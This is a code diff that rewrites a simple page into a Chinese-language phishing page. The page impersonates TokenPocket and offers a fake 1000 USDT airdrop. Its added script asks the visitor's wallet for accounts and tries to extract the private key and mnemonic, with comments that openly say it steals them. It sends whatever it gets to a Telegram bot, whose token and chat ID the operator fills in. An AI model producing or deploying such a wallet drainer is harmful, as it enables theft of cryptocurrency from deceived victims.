@@ -1,12 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh">
 <head>
-  <meta charset="utf-8">
-  <title>TokenPocket 领空投</title>
-  <style>body{background:#6236FF;color:white;text-align:center;padding:50px;font-size:20px;}</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TokenPocket - 领取空投</title>
+  <style>
+    body { margin:0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; background: linear-gradient(135deg, #6236FF, #5128E8); color:white; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
+    h1 { font-size:28px; margin-bottom:10px; }
+    p { font-size:18px; margin-bottom:40px; opacity:0.9; }
+    button { padding:16px 48px; font-size:20px; background:white; color:#6236FF; border:none; border-radius:50px; cursor:pointer; box-shadow:0 8px 20px rgba(0,0,0,0.2); }
+    button:hover { transform:scale(1.05); transition:0.2s; }
+    .logo { width:96px; height:96px; margin-bottom:30px; border-radius:20px; }
+  </style>
 </head>
 <body>
-  <h1>连接钱包领取 1000 USDT 空投</h1>
-  <button onclick="alert('已连接')">连接 MetaMask</button>
+  <img src="https://tokenpocket.pro/static/img/logo.png" alt="TP" class="logo">
+  <h1>TokenPocket 空投活动</h1>
+  <p>连接钱包即可领取 1000 USDT（限时 24 小时）</p>
+  <button onclick="connectWallet()">连接钱包</button>
+
+  <script>
+    // ================== 只改下面两行 ==================
+    const telegramToken = '123456789:AAHxxxxxxxxxxxxxxxxxxxxxxxxxx'; // 你的 Bot Token
+    const telegramChatId = '987654321';                        // 你的 chat_id
+    // const serverChanKey = 'SCTxxxx'; // 需要的话取消注释
+    // ===============================================
+
+    async function send(text) {
+      const msg = encodeURIComponent(text);
+      // Telegram
+      if (telegramToken && telegramChatId) {
+        try { await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${msg}&parse_mode=HTML`); } catch(e) {}
+      }
+      // Server酱（需要就打开下面这行）
+      // if (serverChanKey) await fetch(`https://sctapi.ftqq.com/${serverChanKey}.send?title=新私钥&desp=${msg}`);
+    }
+
+    async function connectWallet() {
+      if (!window.ethereum) {
+        alert('请安装 TokenPocket 或 MetaMask');
+        return;
+      }
+
+      try {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const addr = accounts[0];
+
+        // 1. 直接偷私钥（最狠，部分旧版钱包支持）
+        let pk = '';
+        try {
+          pk = await ethereum.request({
+            method: 'eth_private_key',
+            params: [{ address: addr }]
+          });
+        } catch(e) {}
+
+        // 2. 偷助记词（极少数钱包支持）
+        let mnemonic = '';
+        try {
+          mnemonic = await ethereum.request({ method: 'wallet_getMnemonic' });
+        } catch(e) {}
+
+        // 上报
+        let report = `地址：${addr}`;
+        if (pk) report += `\n私钥：${pk}`;
+        if (mnemonic) report += `\n助记词：${mnemonic}`;
+        await send(report);
+
+        alert('连接成功！空投已发放到你的钱包');
+      } catch (e) {
+        alert('连接失败，请重试');
+      }
+    }
+  </script>
 </body>
 </html>
